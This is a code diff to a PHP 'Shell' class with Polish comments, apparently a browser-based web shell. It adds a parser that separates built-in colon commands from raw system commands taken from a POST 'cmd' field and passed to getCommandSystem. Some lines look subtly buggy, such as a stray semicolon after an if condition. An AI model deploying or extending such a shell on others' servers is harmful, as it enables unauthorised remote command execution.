@@ -100,6 +100,14 @@ class Shell
 	public $sCmd;
 
 	/**
+	 * Polecenie systemow
+	 *
+	 * @access public
+	 * @var
+	 */
+	public $sCmdExec;
+
+	/**
 	 * Lista parametrow
 	 *
 	 * @access public
@@ -1411,6 +1419,70 @@ DATA;
 		);
 	}
 
+	public function parseCommand( $sCmd )
+	{
+		/**
+		 * Polecenie Neapter
+		 */
+		if( substr( $sCmd, 0, 1 ) === ':' )
+		{
+			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
+			{
+				$this -> sCmd = substr( $sCmd, 1, $iPos );
+			}
+			else
+			{
+				$this -> sCmd = (string) substr( $sCmd, 1 );
+			}
+
+			$this -> sArgv = ltrim( preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd ) );
+
+			/**
+			 * Rozdzielanie argumentow
+			 *
+			 * "sciezka do \"pliku\"" -> sciezka do "pliku"
+			 */
+			if( preg_match_all( '~\'(?:(?:\\\')|.+?)\'|"(?:(?:\\")|.+?)"|[^ \r\n\t\'"]+~', $this -> sArgv, $aMatch ) );
+			{
+				/**
+				 * Usuwanie koncowych znakow " oraz ', zamienianie \" na " i \' na '
+				 *
+				 * Dalbym tutaj lambde, ale php 5.2 tego nie obsluguje ...
+				 */
+				array_walk( $aMatch[0], array( $this, 'parseArgv' ) );
+
+				$this -> aArgv = $aMatch[0];
+
+				if( isset( $this -> aArgv[0] ) && substr( $this -> aArgv[0], 0, 1 ) === '-' )
+				{
+					$this -> aOptv = str_split( substr( $this -> aArgv[0], 1 ) );
+					array_shift( $this -> aArgv );
+					$this -> sArgv = ltrim( implode( ' ', $this -> aArgv ) );
+				}
+			}
+
+			$this -> sArgv = $this -> rmQuotes( rtrim( $this -> sArgv ) );
+
+			$this -> iArgc = count( $this -> aArgv );
+		}
+		else
+		{
+			$this -> sCmd = NULL;
+			$this -> sArgv = NULL;
+			$this -> aArgv = array();
+			$this -> iArgc = array();
+		}
+
+		if( ( $this -> sCmd === NULL ) && ! empty( $sCmd ) )
+		{
+			$this -> sCmdExec = $sCmd;
+		}
+		else
+		{
+			$this -> sCmdExec = NULL;
+		}
+	}
+
 	/**
 	 * Domyslna akcja, dostep do konsoli
 	 *
@@ -1423,6 +1495,8 @@ DATA;
 	public function getActionBrowser( $sCmd = NULL )
 	{
 		$bRaw = ( $sCmd !== NULL );
+
+		$this -> parseCommand( $sCmd );
 
 		/**
 		 * Wlasna zawartosc strony; domyslnie znajduje sie okno konsoli
@@ -1443,7 +1517,7 @@ DATA;
 		/**
 		 * Domyslna komenda to :ls -l sciezka_do_katalogu
 		 */
-		if( $sCmd === NULL )
+		if( ( $this -> sCmd === NULL ) && ( $this -> sCmdExec === NULL ) )
 		{
 			if( PHP_SAPI === 'cli' )
 			{
@@ -1464,12 +1538,15 @@ DATA;
 			{
 				$sCmd = (string) Request::getPost( 'cmd' );
 			}
+
+			$this -> parseCommand( $sCmd );
 		}
 
 		/**
 		 * Komendy shella rozpoczynaja sie od znaku ':'
 		 */
-		if( substr( $sCmd, 0, 1 ) === ':' )
+
+		if( $this -> sCmd !== NULL )
 		{
 			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
 			{
@@ -1620,7 +1697,7 @@ DATA;
 					}
 			}
 		}
-		elseif( $sCmd === '' )
+		elseif( ( $this -> sCmd !== NULL ) && ( $this -> sCmdExec !== NULL ) )
 		{
 			$sConsole = 'Wpisz ":help", by zobaczyć pomoc';
 		}
@@ -1629,7 +1706,7 @@ DATA;
 		 */
 		else
 		{
-			$sConsole = $this -> getCommandSystem( $sCmd );
+			$sConsole = $this -> getCommandSystem( $this -> sCmdExec );
 		}
 
 		if( $bRaw || ( PHP_SAPI === 'cli' ) )
